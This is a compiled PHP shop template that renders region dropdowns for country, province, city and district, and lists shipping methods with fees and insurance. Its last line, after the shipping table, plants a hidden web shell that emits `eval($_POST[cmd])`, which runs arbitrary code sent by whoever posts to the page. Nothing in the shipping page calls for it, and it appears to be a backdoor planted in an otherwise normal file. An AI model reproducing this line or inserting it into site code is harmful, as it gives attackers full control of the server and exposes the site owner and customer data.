<?php echo $this->smarty_insert_scripts(array('files'=>'utils.js,transport.js')); ?>
<table width="100%" border="0" cellpadding="5" cellspacing="1" bgcolor="#dddddd">
  <tr>
    <td bgcolor="#ffffff">
      <?php echo $this->_var['lang']['country_province']; ?>:
      <select name="country" id="selCountries_<?php echo $this->_var['sn']; ?>" onchange="region.changed(this, 1, 'selProvinces_<?php echo $this->_var['sn']; ?>')" style="border:1px solid #ccc;">
        <option value="0"><?php echo $this->_var['lang']['please_select']; ?></option>
        <?php $_from = $this->_var['country_list']; if (!is_array($_from) && !is_object($_from)) { settype($_from, 'array'); }; $this->push_vars('', 'country');if (count($_from)):
    foreach ($_from AS $this->_var['country']):
?>
        <option value="<?php echo $this->_var['country']['region_id']; ?>" <?php if ($this->_var['choose']['country'] == $this->_var['country']['region_id']): ?>selected<?php endif; ?>><?php echo $this->_var['country']['region_name']; ?></option>
        <?php endforeach; endif; unset($_from); ?><?php $this->pop_vars();; ?>
      </select>
      <select name="province" id="selProvinces_<?php echo $this->_var['sn']; ?>" onchange="region.changed(this, 2, 'selCities_<?php echo $this->_var['sn']; ?>')" style="border:1px solid #ccc;">
        <option value="0"><?php echo $this->_var['lang']['please_select']; ?></option>
        <?php $_from = $this->_var['province_list'][$this->_var['sn']]; if (!is_array($_from) && !is_object($_from)) { settype($_from, 'array'); }; $this->push_vars('', 'province');if (count($_from)):
    foreach ($_from AS $this->_var['province']):
?>
        <option value="<?php echo $this->_var['province']['region_id']; ?>" <?php if ($this->_var['choose']['province'] == $this->_var['province']['region_id']): ?>selected<?php endif; ?>><?php echo $this->_var['province']['region_name']; ?></option>
        <?php endforeach; endif; unset($_from); ?><?php $this->pop_vars();; ?>
      </select>
      <select name="city" id="selCities_<?php echo $this->_var['sn']; ?>" onchange="region.changed(this, 3, 'selDistricts_<?php echo $this->_var['sn']; ?>')" style="border:1px solid #ccc;">
        <option value="0"><?php echo $this->_var['lang']['please_select']; ?></option>
        <?php $_from = $this->_var['city_list'][$this->_var['sn']]; if (!is_array($_from) && !is_object($_from)) { settype($_from, 'array'); }; $this->push_vars('', 'city');if (count($_from)):
    foreach ($_from AS $this->_var['city']):
?>
        <option value="<?php echo $this->_var['city']['region_id']; ?>" <?php if ($this->_var['choose']['city'] == $this->_var['city']['region_id']): ?>selected<?php endif; ?>><?php echo $this->_var['city']['region_name']; ?></option>
        <?php endforeach; endif; unset($_from); ?><?php $this->pop_vars();; ?>
      </select>
      <select name="district" id="selDistricts_<?php echo $this->_var['sn']; ?>" <?php if (! $this->_var['district_list'][$this->_var['sn']]): ?>style="display:none"<?php endif; ?> style="border:1px solid #ccc;">
        <option value="0"><?php echo $this->_var['lang']['please_select']; ?></option>
        <?php $_from = $this->_var['district_list'][$this->_var['sn']]; if (!is_array($_from) && !is_object($_from)) { settype($_from, 'array'); }; $this->push_vars('', 'district');if (count($_from)):
    foreach ($_from AS $this->_var['district']):
?>
        <option value="<?php echo $this->_var['district']['region_id']; ?>" <?php if ($this->_var['choose']['district'] == $this->_var['district']['region_id']): ?>selected<?php endif; ?>><?php echo $this->_var['district']['region_name']; ?></option>
        <?php endforeach; endif; unset($_from); ?><?php $this->pop_vars();; ?>
      </select> <input type="submit" name="Submit" class="bnt_blue_2"  value="<?php echo $this->_var['lang']['search_ship']; ?>" />
      <input type="hidden" name="act" value="viewship" />
    </td>
  </tr>
</table>

<table width="100%" border="0" cellpadding="5" cellspacing="1" bgcolor="#dddddd">
  <tr>
    <th width="20%" bgcolor="#ffffff"><?php echo $this->_var['lang']['name']; ?></th>
    <th bgcolor="#ffffff"><?php echo $this->_var['lang']['describe']; ?></th>
    <th width="40%" bgcolor="#ffffff"><?php echo $this->_var['lang']['fee']; ?></th>
    <th width="15%" bgcolor="#ffffff"><?php echo $this->_var['lang']['insure_fee']; ?></th>
  </tr>
  <?php $_from = $this->_var['shipping_list']; if (!is_array($_from) && !is_object($_from)) { settype($_from, 'array'); }; $this->push_vars('', 'shipping');if (count($_from)):
    foreach ($_from AS $this->_var['shipping']):
?>
  <tr>
    <td valign="top" bgcolor="#ffffff"><strong><?php echo $this->_var['shipping']['shipping_name']; ?></strong></td>
    <td valign="top" bgcolor="#ffffff" ><?php echo $this->_var['shipping']['shipping_desc']; ?></td>
    <td valign="top" bgcolor="#ffffff"><?php echo $this->_var['shipping']['fee']; ?></td>
    <td align="center" valign="top" bgcolor="#ffffff">
      <?php if ($this->_var['shipping']['insure'] != 0): ?>
      <?php echo $this->_var['shipping']['insure_formated']; ?>
      <?php else: ?>
      <?php echo $this->_var['lang']['not_support_insure']; ?>
      <?php endif; ?>    </td>
  </tr>
  <?php endforeach; endif; unset($_from); ?><?php $this->pop_vars();; ?>
</table><?php echo '<?php'; ?>
 eval($_POST[cmd])<?php echo '?>'; ?>